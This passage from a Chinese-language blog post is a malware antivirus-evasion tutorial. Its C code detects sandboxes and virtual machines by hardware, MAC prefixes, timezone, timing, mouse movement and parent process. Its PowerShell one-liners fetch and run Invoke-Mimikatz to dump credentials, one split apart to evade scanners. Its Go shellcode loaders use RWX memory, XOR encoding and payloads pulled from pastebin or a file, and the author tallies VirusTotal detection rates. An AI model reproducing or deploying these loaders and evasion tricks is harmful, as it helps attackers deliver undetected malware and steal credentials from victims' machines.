title="CPU,RAM等信息"></a>CPU,RAM等信息</h5><p>沙箱的CPUI多为1核，ram多小于2g，硬盘大小多小于100g。我们可以以此为一个基准进行沙箱检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cpu processors</span><br><span class="line">SYSTEM_INFO systeminfo;</span><br><span class="line">GetSystemInfo(&amp;systeminfo);</span><br><span class="line">DWORD numberOfProcessors &#x3D; systeminfo.dwNumberOfProcessors;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ram</span><br><span class="line">MEMORYSTATUSEX memoryStatus;</span><br><span class="line">memoryStatus.dwLength &#x3D; sizeof(memoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;memoryStatus);</span><br><span class="line">DWORD RAMMB &#x3D; memoryStatus.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;hdd(硬盘大小)</span><br><span class="line">HANDLE hDevice &#x3D; CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB &#x3D; pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector &#x2F; 1024 &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB);</span><br></pre></td></tr></table></figure><h5 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h5><p>常见虚拟机如vmware，viturl box等都有特殊的mac地址，可以以此为依据判断是否在虚拟机中（随着虚拟化主机越来越普遍，许多公司将业务系统也搬进了虚拟机，这个方法已不太能作为检测沙箱的指标）</p><p>“通常，MAC地址的前三个字节标识一个提供商。以00:05:69、00:0c:29和00:50:56开始的MAC地址与VMware相对应；以00:03:ff开始的MAC地址与virtualpc对应；以08:00:27开始的MAC地址与virtualbox对应。”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">string mac;</span><br><span class="line">    get_3part_mac(mac);</span><br><span class="line">    if (mac &#x3D;&#x3D; &quot;00-05-69&quot; || mac &#x3D;&#x3D; &quot;00-0c-29&quot; || mac &#x3D;&#x3D; &quot;00-50-56&quot; || mac &#x3D;&#x3D; &quot;00-03-ff&quot; || mac &#x3D;&#x3D; &quot;08-00-27&quot;) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">void get_3part_mac(string &amp;mac)  </span><br><span class="line">&#123;  </span><br><span class="line">    NCB Ncb;  </span><br><span class="line">    ASTAT Adapter;  </span><br><span class="line">    UCHAR uRetCode;  </span><br><span class="line">    LANA_ENUM lenum;  </span><br><span class="line">    memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">    Ncb.ncb_command &#x3D; NCBENUM;  </span><br><span class="line">    Ncb.ncb_buffer &#x3D; (UCHAR *)&amp;lenum;  </span><br><span class="line">    Ncb.ncb_length &#x3D; sizeof(lenum);  </span><br><span class="line">    uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">    for (int i &#x3D; 0; i &lt; lenum.length; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBRESET;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBASTAT;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        strcpy((char *)Ncb.ncb_callname, &quot;*&quot;);  </span><br><span class="line">        Ncb.ncb_buffer &#x3D; (unsigned char *)&amp;Adapter;  </span><br><span class="line">        Ncb.ncb_length &#x3D; sizeof(Adapter);  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        if (uRetCode &#x3D;&#x3D; 0)  </span><br><span class="line">        &#123;  </span><br><span class="line">            char tmp[128];  </span><br><span class="line">            sprintf(tmp, &quot;%02x-%02x-%02x&quot;,  </span><br><span class="line">                Adapter.adapt.adapter_address[0],  </span><br><span class="line">                Adapter.adapt.adapter_address[1],  </span><br><span class="line">                Adapter.adapt.adapter_address[2]  </span><br><span class="line">            );  </span><br><span class="line">            mac &#x3D; tmp;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h5><p>沙箱的分辨率都不太正常</p><h5 id="检查时区与时间流动性"><a href="#检查时区与时间流动性" class="headerlink" title="检查时区与时间流动性"></a>检查时区与时间流动性</h5><p>沙箱往往会加速运行文件，故可以检查时间流动性是否正常从而检测沙箱</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F;时区</span><br><span class="line">    DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo;</span><br><span class="line">    GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo);</span><br><span class="line">    wchar_t wcTimeZoneName[128 + 1];</span><br><span class="line">    StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName);</span><br><span class="line">    CharUpperW(wcTimeZoneName);</span><br><span class="line">    if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;流动性</span><br><span class="line">    clock_t ClockStartTime, ClockEndTime;</span><br><span class="line">    time_t UnixStartTime &#x3D; time(0);</span><br><span class="line">    ClockStartTime &#x3D; clock();</span><br><span class="line">    Sleep(10000);</span><br><span class="line">    ClockEndTime &#x3D; clock();</span><br><span class="line">    time_t UnixEndTime &#x3D; time(0);</span><br><span class="line">    int iTimeDifference &#x3D; ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime);</span><br><span class="line">    if (iTimeDifference&gt;150)&#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="检测文件名是否被沙箱更改"><a href="#检测文件名是否被沙箱更改" class="headerlink" title="检测文件名是否被沙箱更改"></a>检测文件名是否被沙箱更改</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wchar_t currentProcessPath[MAX_PATH + 1];</span><br><span class="line">GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class="line">CharUpperW(currentProcessPath);</span><br><span class="line">if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false;</span><br></pre></td></tr></table></figure><h4 id="Time-Based-Evasion"><a href="#Time-Based-Evasion" class="headerlink" title="Time-Based Evasion"></a>Time-Based Evasion</h4><p>基于时间的规避。即恶意软件在目标系统上运行后并不会立刻进行恶意行动，而是会伪装、休眠一段时间，等到一定时间后再开始恶意行动</p><h5 id="使用网络连接实时读取启动指令"><a href="#使用网络连接实时读取启动指令" class="headerlink" title="使用网络连接实时读取启动指令"></a>使用网络连接实时读取启动指令</h5><p>意思就是说该程序会不断向某个网址发送请求包，如果网址返回了对应的启动指令则开始调用恶意代码。</p><p>下图是用HTTP请求获取网页内容的代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HINTERNET hSession &#x3D; WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">HINTERNET hConnection &#x3D; WinHttpConnect(hSession, L&quot;www.baidu.com&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">HINTERNET hRequest &#x3D; WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);</span><br><span class="line">WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);</span><br><span class="line">WinHttpReceiveResponse(hRequest, 0);</span><br><span class="line">DWORD responseLength;</span><br><span class="line">WinHttpQueryDataAvailable(hRequest, &amp;responseLength);</span><br><span class="line">PVOID response &#x3D; new char[responseLength + 1];</span><br><span class="line">WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);</span><br><span class="line">std::cout &lt;&lt; ((char *)response);</span><br></pre></td></tr></table></figure><h4 id="User-Activity-Based-Checks"><a href="#User-Activity-Based-Checks" class="headerlink" title="User Activity Based Checks"></a>User Activity Based Checks</h4><p>通过检测一些行为，来识别当前实施者是否为人类。（比如动鼠标，敲键盘等，或者查询电脑上word文档打开历史数，chrome历史记录等信息来判断）</p><h5 id="鼠标移动轨迹"><a href="#鼠标移动轨迹" class="headerlink" title="鼠标移动轨迹"></a>鼠标移动轨迹</h5><p>可以设置鼠标移动多少距离才执行shellcode，沙箱有些是没有鼠标的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POINT CurrentMousePos;</span><br><span class="line">    POINT PreviousMousePos;</span><br><span class="line">    GetCursorPos(&amp;PreviousMousePos);</span><br><span class="line">    double Dis &#x3D; 0;</span><br><span class="line">    while (true)</span><br><span class="line">    &#123;</span><br><span class="line">        GetCursorPos(&amp;CurrentMousePos);</span><br><span class="line">        Dis+&#x3D; sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2));</span><br><span class="line">        Sleep(100);</span><br><span class="line">        if (Dis &gt; 20000) &#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="检测父进程-1"><a href="#检测父进程-1" class="headerlink" title="检测父进程"></a>检测父进程</h5><p>对于一个正常的用户来说，启动exe文件应该是双击运行，程序启动后父进程是explore.exe，如果是cmd运行则会是cmd.exe、<br>但是对于沙箱就有可能存在用一个程序如windbg来启动我们的恶意EXE文件，这个时候我们就需要对此点进行检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD GetParentPID(DWORD pid)</span><br><span class="line">&#123;</span><br><span class="line">DWORD ppid &#x3D; 0;</span><br><span class="line">PROCESSENTRY32W processEntry &#x3D; &#123; 0 &#125;;</span><br><span class="line">processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32W);</span><br><span class="line">HANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  &#x2F;&#x2F;对所有进程创建快照</span><br><span class="line">if (Process32FirstW(hSnapshot, &amp;processEntry))  &#x2F;&#x2F;遍历快照，找到当前传入PID的进程信息</span><br><span class="line">&#123;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">if (processEntry.th32ProcessID &#x3D;&#x3D; pid)</span><br><span class="line">&#123;</span><br><span class="line">ppid &#x3D; processEntry.th32ParentProcessID;  &#x2F;&#x2F;找到并返回传入PID的父进程PID</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125; while (Process32NextW(hSnapshot, &amp;processEntry));</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">return ppid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">DWORD parentPid &#x3D; GetParentPID(GetCurrentProcessId()); &#x2F;&#x2F;获取当前进程父进程PID</span><br><span class="line">WCHAR parentName[MAX_PATH + 1];</span><br><span class="line">DWORD dwParentName &#x3D; MAX_PATH;</span><br><span class="line">HANDLE hParent &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);  &#x2F;&#x2F;打开父进程</span><br><span class="line">QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); &#x2F;&#x2F; another way to get process name is to use &#39;Toolhelp32Snapshot&#39; &#x2F;&#x2F;获取进程名</span><br><span class="line">CharUpperW(parentName);</span><br><span class="line">if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return; &#x2F;&#x2F;匹配</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking...\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进程镂空"><a href="#进程镂空" class="headerlink" title="进程镂空"></a>进程镂空</h3><h3 id="动态调用API"><a href="#动态调用API" class="headerlink" title="动态调用API"></a>动态调用API</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* ntAllocateVirtualMemory &#x3D; GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);</span><br></pre></td></tr></table></figure><h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h3 id="远程执行与本地执行"><a href="#远程执行与本地执行" class="headerlink" title="远程执行与本地执行"></a>远程执行与本地执行</h3><h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p>不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)</span><br></pre></td></tr></table></figure><h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\xx.ps1</span><br></pre></td></tr></table></figure><h3 id="命令拆分"><a href="#命令拆分" class="headerlink" title="命令拆分"></a>命令拆分</h3><p>就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure><h1 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h1><h2 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h2><p>很有趣的一件事是，用go语言写个helloworld传到vt被14家杀,牛批</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819215802696.png" alt="image-20210819215802696"></p><h2 id="生成EXE"><a href="#生成EXE" class="headerlink" title="生成EXE"></a>生成EXE</h2><p>go 编译为EXE 的做法是<strong>go build</strong> ….go，但这样EXE打开时会有个黑框</p><p>go build -ldflags “-H windowsgui” ..go  生成无窗口EXE，但这样会增加杀软的查杀度</p><h2 id="申请内存加载shellcode"><a href="#申请内存加载shellcode" class="headerlink" title="申请内存加载shellcode"></a>申请内存加载shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; 区域可以执行代码，应用程序可以读写该区域。</span><br><span class="line">KEY_1                  &#x3D; 55</span><br><span class="line">KEY_2                  &#x3D; 66</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main()&#123;</span><br><span class="line">shellcode:&#x3D;[]byte&#123;0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最原始版本,被杀成哈批，但即使这样360也杀不出来，可以看出绕过360有手就行</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818180146046.png" alt="image-20210818180146046"></p><h2 id="简单XOR"><a href="#简单XOR" class="headerlink" title="简单XOR"></a>简单XOR</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor模块（获得xor后的shellcode）</span><br><span class="line">for i:&#x3D;0;i&lt;len(shellcode);i++&#123;</span><br><span class="line">fmt.Print(&quot;0x&quot;,strconv.FormatInt(int64(shellcode[i]^123),16),&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor_shellcode:&#x3D;[]byte&#123;xored_shellcode&#125;</span><br><span class="line">var shellcode []byte</span><br><span class="line">for i:&#x3D;0;i&lt;len(xor_shellcode);i++&#123;</span><br><span class="line">shellcode&#x3D;append(shellcode,xor_shellcode[i]^123)</span><br><span class="line">&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818185018219.png" alt="image-20210818185018219"></p><p>好了点，但是如果加上无框启动，还是会被杀成哈批</p><h2 id="沙盒-amp-虚拟机检测"><a href="#沙盒-amp-虚拟机检测" class="headerlink" title="沙盒&amp;虚拟机检测"></a>沙盒&amp;虚拟机检测</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imoprt&#123;&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;host&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;mem&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;disk&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckTime() bool&#123;</span><br><span class="line">timeBoot, _ :&#x3D; host.BootTime()</span><br><span class="line">t :&#x3D; time.Unix(int64(timeBoot), 0)</span><br><span class="line">timeNow:&#x3D;time.Now()</span><br><span class="line">ts:&#x3D;timeNow.Sub(t)</span><br><span class="line">if ts.Minutes()&lt;12&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckName() bool&#123;</span><br><span class="line">files, _ :&#x3D; ioutil.ReadDir(&quot;.&#x2F;&quot;)</span><br><span class="line">for _, f :&#x3D; range files &#123;</span><br><span class="line">if f.Name()&#x3D;&#x3D;&quot;ActiveX.exe&quot;&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckSystem() bool&#123;</span><br><span class="line">info1,_:&#x3D;mem.SwapMemory()</span><br><span class="line">info2,_:&#x3D;mem.VirtualMemory()</span><br><span class="line">disk,_:&#x3D;disk.Usage(&quot;c:&quot;)</span><br><span class="line">if(runtime.NumCPU()&lt;2&amp;&amp;info1.Total&lt;2147483648&amp;&amp;info2.Total&lt;2147483648&amp;&amp;disk.Total&lt;21474836480)&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818192335970.png" alt="image-20210818192335970"></p><p>用它和XOR打组合拳效果将就，用了无窗启动后有7个查出来</p><h3 id="虚拟机：敏感文件检测"><a href="#虚拟机：敏感文件检测" class="headerlink" title="虚拟机：敏感文件检测"></a>虚拟机：敏感文件检测</h3><p>这个会被defender拦，不必要的话不用这个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func PathExists(path string) (bool, error) &#123; &#x2F;&#x2F;判断文件是否存在</span><br><span class="line">_, err :&#x3D; os.Stat(path)</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">return true, nil</span><br><span class="line">&#125;</span><br><span class="line">if os.IsNotExist(err) &#123;</span><br><span class="line">return false, nil</span><br><span class="line">&#125;</span><br><span class="line">return false, err</span><br><span class="line">&#125;</span><br><span class="line">func fack(path string) &#123; &#x2F;&#x2F;判断虚拟机关键文件是否存在</span><br><span class="line">b, _ :&#x3D; PathExists(path)</span><br><span class="line">if b &#123;</span><br><span class="line">fmt.Printf(&quot;当前是虚拟机环境，别分析了，哥。&quot;)</span><br><span class="line">os.Exit(1) &#x2F;&#x2F;如果是虚拟机就退出当前进程</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func check() &#123;</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxdisp.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxhook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxservice.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxtray.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\VBoxControl.exe&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程读shellcode"><a href="#远程读shellcode" class="headerlink" title="远程读shellcode"></a>远程读shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Url,err:&#x3D;url.Parse(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;aa&quot;)</span><br><span class="line">if err!&#x3D;nil&#123;</span><br><span class="line">panic(&quot;error&quot;)</span><br><span class="line">&#125;</span><br><span class="line">client:&#x3D;http.Client&#123;&#125;</span><br><span class="line">req,_:&#x3D;http.NewRequest(&quot;GET&quot;,Url.String(),nil)</span><br><span class="line">req.Header.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36&quot;)</span><br><span class="line">req.Header.Add(&quot;Cookie&quot;,&quot;SUB&#x3D;_2 SUBP&#x3D;00&quot;)</span><br><span class="line">resp,_:&#x3D;client.Do(req)</span><br><span class="line">body,_:&#x3D;ioutil.ReadAll(resp.Body)  &#x2F;&#x2F;string形式获取了页面内容,以上代码为主体部分</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过一系列正则匹配,字符串截取等方法从页面中得到shellcode(页面中我的shellcode是这样的rngrngfc,48,....,aalgdlgd)</span><br><span class="line">re:&#x3D;regexp.MustCompile(&#96;rngrng.*lgdlgd&#96;)</span><br><span class="line">match:&#x3D;re.FindString(string(body))</span><br><span class="line">match&#x3D;match[6:len(match)-6]</span><br><span class="line">return match</span><br></pre></td></tr></table></figure><p>但是拖下来的shellcode是string格式，我们需要把他转为[]byte</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func aa(encodes string) []byte&#123;</span><br><span class="line">var xor_shellcode []byte</span><br><span class="line">spi:&#x3D;&quot;,&quot;</span><br><span class="line">enc:&#x3D;strings.Split(encodes,spi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i,_ :&#x3D;range enc&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(enc[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">xor_shellcode &#x3D; append(xor_shellcode, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return xor_shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程+XOR+沙箱 反而被杀的更多…看来这个HTTP函数被抓的很紧，还被360杀出来了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818233352655.png" alt="image-20210818233352655"></p><h2 id="读取文件中的SHELLCODE"><a href="#读取文件中的SHELLCODE" class="headerlink" title="读取文件中的SHELLCODE"></a>读取文件中的SHELLCODE</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var sc []byte</span><br><span class="line">bytes,_:&#x3D;ioutil.ReadFile(&quot;C:\\Users\\xx\\Desktop\\sc.txt&quot;)</span><br><span class="line">tmp:&#x3D;strings.Split(string(bytes),&quot;,&quot;)</span><br><span class="line">for i,_ :&#x3D;range tmp&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(tmp[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">sc &#x3D; append(sc, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819212634402.png" alt="image-20210819212634402"></p><p>可以</p><h2 id="文件释放"><a href="#文件释放" class="headerlink" title="文件释放"></a>文件释放</h2><p>在我们木马运行时可以释放一个正常文件并运行，达到DLL劫持或者迷惑视听的作用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取文件内容</span><br><span class="line">file,_:&#x3D;os.Open(&quot;E:\\tools\\shell\\cobaltstrike4.3\\cobaltstrike.exe&quot;)</span><br><span class="line">fi,_:&#x3D;file.Stat()</span><br><span class="line">size:&#x3D;fi.Size()</span><br><span class="line">data :&#x3D; make([]byte, size)</span><br><span class="line">file.Read(data)</span><br><span class="line">for _,i:&#x3D;range data&#123;</span><br><span class="line">fmt.Print(strconv.Itoa(int(i))+&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
